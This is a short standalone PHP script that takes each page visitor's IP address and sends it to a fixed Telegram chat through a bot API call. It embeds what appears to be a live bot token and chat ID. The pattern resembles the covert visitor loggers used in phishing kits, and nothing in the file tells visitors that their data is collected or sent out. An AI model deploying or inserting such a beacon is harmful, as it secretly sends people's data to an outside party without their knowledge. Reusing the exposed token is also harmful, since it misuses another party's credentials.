<?php 
$apiToken = "5947991166:AAGycvpk1wX_g3tht0avB5xaB6O3_3aGQ7s"; 
  $iPAPI_1 = $_SERVER['REMOTE_ADDR'];
$data = [ 
 'chat_id' => '5034573446', 
 'text' => 'ip '.$iPAPI_1
]; 
 
$response = file_get_contents("http://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); 
?>
